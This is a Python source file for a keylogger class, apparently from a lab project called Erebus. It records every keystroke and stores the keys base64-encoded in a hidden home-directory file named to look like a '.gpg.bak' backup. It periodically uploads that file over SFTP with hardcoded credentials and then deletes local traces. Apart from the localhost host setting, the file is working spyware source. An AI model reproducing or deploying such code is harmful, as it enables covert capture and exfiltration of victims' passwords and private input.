import os
import pynput
import threading
import time
from typing import List
import base64
from random import randint
import paramiko
from datetime import datetime
import getpass
from pathlib import Path

THREE_MINUTES_IN_SECONDS = 180
FIVE_MINUTES_IN_SECONDS = 500

MINIMUM_UPLOAD_TIME_IN_SECONDS = 1800
MAXIMUM_UPLOAD_TIME_IN_SECONDS = 7200

OUTPUT_FILE_PATH = "/home/lab/Erebus/output/"

USERNAME = "lab"
PASSWORD = "lab"

HOST_IP_ADDRESS = "localhost"
HOST_PORT = 22

DATE_FORMAT = "%d-%m-%Y-%H:%M:%S"


class KeyLogger:
    def __init__(self, logFileName: str = ".gpg.bak"):
        self._logFilePath = f"{Path.home()}/{logFileName}"
        self._keyboardListner = pynput.keyboard.Listener(on_press=self._onKeyPress)
        self._cache: List[str] = []
        self._username = getpass.getuser()

    def _onKeyPress(self, key: pynput.keyboard.Key) -> None:
        """Add user inputted key to the logs."""
        self._cache.append(f"{key}")

    def _logKeys(self) -> None:
        """Log all keys typed by the user.
        
        It saves the keys typed by the user every 3 to 5 minutes.

        Note that this removes any log files in case of an exception.
        """
        self._keyboardListner.start()

        while True:
            try:
                randomNumberOfSeconds = randint(
                    THREE_MINUTES_IN_SECONDS, FIVE_MINUTES_IN_SECONDS
                )
                time.sleep(10)
                self._writeToLogFile()
            except:
                self._keyboardListner.stop()
                os.remove(self._logFilePath)

    def _writeToLogFile(self) -> None:
        """Write all stored data to a file and clear the memory"""
        keysAsOneString = " ".join(self._cache)
        encodedKeys = base64.encodebytes(keysAsOneString.encode("utf-8"))

        with open(self._logFilePath, "wb+") as logFile:
            logFile.write(encodedKeys)

        self._cache.clear()

    def start(self) -> None:
        """Start logging keys.
        
        Note that this method starts a thread to log keys. It is not
        possible to stop this thread.
        """
        logThread = threading.Thread(target=self._logKeys)
        logThread.start()

        uploadThread = threading.Thread(target=self._uploadLogs)
        uploadThread.start()

    def _uploadLogs(self) -> None:
        """Upload the files periodically."""
        while True:
            randomNumberOfSeconds = randint(
                MINIMUM_UPLOAD_TIME_IN_SECONDS, MAXIMUM_UPLOAD_TIME_IN_SECONDS
            )
            time.sleep(15)

            with paramiko.Transport((HOST_IP_ADDRESS, HOST_PORT)) as transport:
                transport.connect(None, USERNAME, PASSWORD)
                with paramiko.SFTPClient.from_transport(transport) as sftp:

                    filePath = self._generateFilePath()
                    sftp.put(self._logFilePath, filePath)

            self._removeLogFile()

    def _generateFilePath(self) -> str:
        """Return a new file path.

        The format is as follows:
            OUTPUT_FILE_PATH/username-day-month-year-hour:minute:second
        
        Example:
            >>> self._generateFilePath()
            ~/Erebus/output/lab-11-12-2019-12:22:
        """
        currentDateAndTime = datetime.now()
        timestamp = currentDateAndTime.strftime(DATE_FORMAT)

        return f"{OUTPUT_FILE_PATH}LOG-{self._username}-{timestamp}"

    def _removeLogFile(self) -> None:
        """Remove the log file."""
        os.remove(self._logFilePath)

